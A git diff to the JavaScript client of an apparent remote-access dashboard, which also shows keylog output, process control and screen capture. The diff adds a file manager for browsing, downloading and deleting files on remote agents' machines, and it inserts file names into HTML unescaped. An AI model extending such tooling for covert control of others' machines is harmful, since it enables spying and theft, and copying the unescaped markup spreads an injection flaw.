@@ -7,6 +7,7 @@ document.addEventListener('DOMContentLoaded', () => {
     let isKeylogClean = true;
     let scanInterval = null; // Biến quản lý vòng lặp quét mạng
     let currentAgentId = null; // Agent hiện đang được chọn
+    let currentPath = "C:\\";
 
     // --- BỘ CHỌN DOM ---
     const $ = (s) => document.querySelector(s);
@@ -275,17 +276,48 @@ document.addEventListener('DOMContentLoaded', () => {
                 break;
 
             case 'status':
+                if (currentView === 'files') {
+                    unlockFileUI(); // Mở khóa khi gặp lỗi
+                }    
+
                 if (msg.success) {
                     if (isStopAppOpen) sendWsMessage({ command: 'list_applications' });
                     if (isStopProcOpen) sendWsMessage({ command: 'list_processes' });
 
                     if (currentView.includes('process')) sendWsMessage({ command: 'list_processes' });
                     if (currentView.includes('app')) sendWsMessage({ command: 'list_applications' });
+                    if (currentView === 'files') {
+                        sendWsMessage({ command: 'fs_list', path: currentPath, context: 'view' });
+                    }
                 } else {
+                    if (currentView === 'files') {
+                        const grid = document.getElementById('file-grid');
+                        if (grid) {
+                            grid.style.opacity = '1';
+                            grid.style.pointerEvents = 'auto';
+                        }
+                    }
+
                     if (msg.message === 'capture failed') {
                         captureSpinner.classList.add('hidden');
                         capturePlaceholder.parentElement.classList.remove('hidden');
                     } else alert('Error: ' + msg.message);
+                }
+                break;
+
+            case 'drive_list':
+                renderDriveTree(msg.data);
+                break;
+            case 'file_list':
+                unlockFileUI();
+                if (msg.context === 'tree') appendTreeChildren(msg.path, msg.data);
+                else renderFileList(msg.path, msg.data);
+                break;
+            case 'file_download':
+                if (msg.success) {
+                    downloadBase64File(msg.data, msg.name);
+                } else {
+                    alert("Download failed!");
                 }
                 break;
         }
@@ -709,8 +741,204 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     function loadDataForView(id) {
-        if (id === 'processes-table') sendWsMessage({ command: 'list_processes' });
-        else if (id === 'applications-table') sendWsMessage({ command: 'list_applications' });
+        if (id === 'processes-table') {
+            sendWsMessage({ command: 'list_processes' });
+        } else if (id === 'applications-table') {
+            sendWsMessage({ command: 'list_applications' });
+        } else if (id === 'files') {
+            // [MỚI] Tự động tải danh sách ổ đĩa và thư mục gốc khi vào tab File
+            sendWsMessage({ command: 'fs_drives' });
+            sendWsMessage({ command: 'fs_list', path: currentPath, context: 'view' });
+        }
+    }
+
+    // --- FILE MANAGER ---
+    function renderDriveTree(drives) {
+        const container = document.getElementById('fs-tree-container');
+        container.innerHTML = drives.map(d => {
+            const safePath = d.path.replace(/\\/g, '\\\\');
+            return `
+            <div class="tree-node" data-path="${d.path}" data-loaded="false">
+                <div class="tree-item" onclick="onTreeItemClick(this, '${safePath}')">
+                    <span class="tree-toggle" onclick="onTreeToggle(event, this, '${safePath}')"><i data-feather="chevron-right"></i></span>
+                    <i data-feather="hard-drive" style="width:14px;height:14px;"></i> <span>${d.name}</span>
+                </div>
+                <div class="tree-children" id="tree-child-${sanitizeId(d.path)}"></div>
+            </div>`;
+        }).join('');
+        if (typeof feather !== 'undefined') feather.replace();
+    }
+
+    function unlockFileUI() {
+        const grid = document.getElementById('file-grid');
+        if (grid) {
+            grid.style.opacity = '1';
+            grid.style.pointerEvents = 'auto';
+            grid.style.cursor = 'default';
+        }
+    }
+
+    window.onTreeToggle = (e, toggleBtn, path) => {
+        e.stopPropagation();
+        const node = toggleBtn.closest('.tree-node');
+        const childBox = node.querySelector('.tree-children');
+        if (childBox.classList.contains('show')) {
+            childBox.classList.remove('show');
+            toggleBtn.classList.remove('expanded');
+        } else {
+            childBox.classList.add('show');
+            toggleBtn.classList.add('expanded');
+            if (node.dataset.loaded !== 'true') {
+                childBox.innerHTML = '<div style="padding:4px 0 0 24px;font-size:11px;color:#888">Loading...</div>';
+                sendWsMessage({ command: 'fs_list', path: path, context: 'tree' });
+            }
+        }
+    };
+
+    window.onTreeItemClick = (el, path) => {
+        document.querySelectorAll('.tree-item').forEach(i => i.classList.remove('active'));
+        el.classList.add('active');
+        sendWsMessage({ command: 'fs_list', path: path, context: 'view' });
+    };
+
+    function appendTreeChildren(parentPath, items) {
+        const safeId = sanitizeId(parentPath);
+        const childBox = document.getElementById(`tree-child-${safeId}`);
+        if(!childBox) return;
+        
+        childBox.closest('.tree-node').dataset.loaded = 'true';
+        const folders = items.filter(i => i.type === 'folder');
+        
+        if (folders.length === 0) {
+            childBox.innerHTML = '<div style="padding:4px 0 4px 24px;font-size:11px;font-style:italic;opacity:0.6">Empty</div>';
+            return;
+        }
+
+        childBox.innerHTML = folders.map(f => {
+            let childPath = parentPath.endsWith('\\') ? parentPath + f.name : parentPath + '\\' + f.name;
+            const safeChildPath = childPath.replace(/\\/g, '\\\\');
+            return `
+            <div class="tree-node" data-path="${childPath}" data-loaded="false">
+                <div class="tree-item" onclick="onTreeItemClick(this, '${safeChildPath}')">
+                    <span class="tree-toggle" onclick="onTreeToggle(event, this, '${safeChildPath}')"><i data-feather="chevron-right"></i></span>
+                    <i data-feather="folder" style="width:14px;height:14px;color:#fbbf24"></i> <span>${f.name}</span>
+                </div>
+                <div class="tree-children" id="tree-child-${sanitizeId(childPath)}"></div>
+            </div>`;
+        }).join('');
+        if (typeof feather !== 'undefined') feather.replace();
+    }
+
+    function renderFileList(path, data) {
+        currentPath = path;
+
+        // Khôi phục lại giao diện
+        const grid = document.getElementById('file-grid');
+        if (grid) {
+            grid.style.opacity = '1';
+            grid.style.pointerEvents = 'auto';
+        }
+
+        const input = document.getElementById('fs-path-input');
+        if (input) input.value = path;
+                
+        if (!data || data.length === 0) {
+            // ... Giữ nguyên phần Empty State ...
+            grid.innerHTML = `<div style="padding:40px;text-align:center;grid-column:1/-1;color:var(--text-muted)">Empty Folder</div>`;
+            return;
+        }
+
+        data.sort((a, b) => {
+            if (a.type === b.type) return a.name.localeCompare(b.name);
+            return a.type === 'folder' ? -1 : 1;
+        });
+
+        grid.innerHTML = data.map(item => {
+            const isFolder = item.type === 'folder';
+            const icon = isFolder ? 'folder' : 'file-text';
+            let fullPath = path.endsWith('\\') ? path + item.name : path + '\\' + item.name;
+            const safePath = fullPath.replace(/\\/g, '\\\\');
+            const actionAttr = isFolder ? `ondblclick="openFolder('${safePath}')"` : '';
+            
+            // Thêm nút Download nếu là file
+            // Title hiển thị tên đầy đủ khi hover
+            return `
+            <div class="file-item" data-type="${item.type}" ${actionAttr} title="${item.name}">
+                <div class="file-actions">
+                    ${!isFolder ? `
+                    <button class="btn-fs-action download" onclick="requestDownloadFile('${item.name}')" title="Download">
+                        <i data-feather="download" style="width:12px;"></i>
+                    </button>` : ''}
+                    <button class="btn-fs-action delete" onclick="requestDeleteFile('${item.name}')" title="Delete">
+                        <i data-feather="trash-2" style="width:12px;"></i>
+                    </button>
+                </div>
+                
+                <div class="file-icon">
+                    <i data-feather="${icon}" style="width:32px;height:32px;"></i>
+                </div>
+                <span class="file-name">${item.name}</span>
+                ${!isFolder ? `<span style="font-size:10px;color:var(--text-muted);margin-top:2px">${(item.size/1024).toFixed(0)} KB</span>` : ''}
+            </div>`;
+        }).join('');
+
+        if (typeof feather !== 'undefined') feather.replace();
+    }
+
+    function sanitizeId(str) { return str.replace(/[^a-zA-Z0-9]/g, '-'); }
+
+    window.requestDeleteFile = (name) => {
+        event.stopPropagation();
+        const fullPath = currentPath.endsWith('\\') ? currentPath + name : currentPath + '\\' + name;
+        if(confirm(`Delete "${name}"?`)) {
+            sendWsMessage({ command: 'fs_delete', path: fullPath });
+        }
+    };
+
+    // Hàm helper để mở thư mục (Dùng cho sự kiện Double Click)
+    window.openFolder = (path) => {
+        // 1. Khóa giao diện
+        const grid = document.getElementById('file-grid');
+        if (grid) {
+            grid.style.opacity = '0.5'; 
+            grid.style.pointerEvents = 'none'; // Chặn click
+            grid.style.cursor = 'wait';        // Hiện con trỏ loading
+        }
+
+        // 2. Đặt bộ hẹn giờ an toàn (Safety Timer)
+        setTimeout(() => {
+            unlockFileUI();
+        }, 1000);
+
+        // 3. Gửi lệnh đi như bình thường
+        sendWsMessage({ command: 'fs_list', path: path, context: 'view' });
+    };
+
+    window.requestDownloadFile = (name) => {
+        event.stopPropagation(); // Ngăn chọn item khi bấm nút
+        const fullPath = currentPath.endsWith('\\') ? currentPath + name : currentPath + '\\' + name;
+        // Gửi lệnh xuống Server
+        sendWsMessage({ command: 'fs_download', path: fullPath });
+    };
+    
+    function downloadBase64File(base64, fileName) {
+        try {
+            const binaryString = atob(base64);
+            const bytes = new Uint8Array(binaryString.length);
+            for (let i = 0; i < binaryString.length; i++) {
+                bytes[i] = binaryString.charCodeAt(i);
+            }
+            const blob = new Blob([bytes], { type: "application/octet-stream" });
+            const link = document.createElement('a');
+            link.href = URL.createObjectURL(blob);
+            link.download = fileName;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        } catch (e) {
+            console.error("Download error", e);
+            alert("Error saving file.");
+        }
     }
 
     // --- INIT ---
@@ -1025,6 +1253,93 @@ document.addEventListener('DOMContentLoaded', () => {
             keylogOutput.textContent = 'Cleared.';
             isKeylogClean = true;
         };
+
+        // File manager
+        // 1. Nút "Go": Đi đến đường dẫn nhập trong ô input
+        const btnFsGo = $('#btn-fs-go');
+        if (btnFsGo) {
+            btnFsGo.onclick = () => {
+                const path = $('#fs-path-input').value;
+                if (path) sendWsMessage({ command: 'fs_list', path: path, context: 'view' });
+            };
+        }
+
+        // 2. Ô Input: Nhấn Enter cũng kích hoạt "Go"
+        const inputFsPath = $('#fs-path-input');
+        if (inputFsPath) {
+            inputFsPath.addEventListener("keypress", (event) => {
+                if (event.key === "Enter") btnFsGo.click();
+            });
+        }
+
+        // 3. Nút "Up": Quay lại thư mục cha
+        const btnFsUp = document.querySelector('#btn-fs-up');
+        if (btnFsUp) {
+            btnFsUp.onclick = () => {
+                let p = currentPath;
+                // Xóa dấu \ ở cuối nếu có (để tránh lỗi split)
+                if (p.endsWith('\\') || p.endsWith('/')) p = p.slice(0, -1);
+                
+                // Tìm dấu gạch chéo cuối cùng
+                const lastSlash = Math.max(p.lastIndexOf('\\'), p.lastIndexOf('/'));
+                
+                if (lastSlash === -1) {
+                    // Nếu không còn dấu gạch chéo nào (ví dụ đang ở C: hoặc list ổ đĩa), không làm gì hoặc load lại Drives
+                    sendWsMessage({ command: 'fs_drives' });
+                    return;
+                }
+
+                let parent = p.substring(0, lastSlash);
+                
+                // Fix trường hợp về root đĩa (VD: C: -> C:\)
+                if (parent.length === 2 && parent.charAt(1) === ':') {
+                    parent += "\\";
+                }
+                
+                // Nếu chuỗi rỗng thì load drives
+                if (parent === "") {
+                    sendWsMessage({ command: 'fs_drives' });
+                } else {
+                    sendWsMessage({ command: 'fs_list', path: parent, context: 'view' });
+                }
+            };
+        }
+
+        // 4. Nút "Refresh": Tải lại cả Cây thư mục và Lưới file
+        const btnFsRefresh = $('#btn-fs-refresh');
+        if (btnFsRefresh) {
+            btnFsRefresh.onclick = () => {
+                if (ws && ws.readyState === WebSocket.OPEN) {
+                    sendWsMessage({ command: 'fs_drives' }); // Reload Tree
+                    sendWsMessage({ command: 'fs_list', path: currentPath, context: 'view' }); // Reload Grid
+                }
+            };
+        }
+
+        // 5. Nút "New Folder"
+        const btnNewFolder = $('#btn-fs-new-folder');
+        if (btnNewFolder) {
+            btnNewFolder.onclick = () => {
+                const name = prompt("Enter new folder name:");
+                if (name) {
+                    const fullPath = currentPath.endsWith('\\') ? currentPath + name : currentPath + '\\' + name;
+                    sendWsMessage({ command: 'fs_mkdir', path: fullPath });
+                }
+            };
+        }
+
+        // 6. Nút "New File"
+        const btnNewFile = $('#btn-fs-new-file');
+        if (btnNewFile) {
+            btnNewFile.onclick = () => {
+                const name = prompt("Enter new file name (e.g., text.txt):");
+                if (name) {
+                    const fullPath = currentPath.endsWith('\\') ? currentPath + name : currentPath + '\\' + name;
+                    sendWsMessage({ command: 'fs_mkfile', path: fullPath });
+                    setTimeout(() => sendWsMessage({ command: 'fs_list', path: currentPath, context: 'view' }), 500);
+                }
+            };
+        }
 
         // Modals Common
         $('#btn-start-process').onclick = () => showModal('modal-start-process');
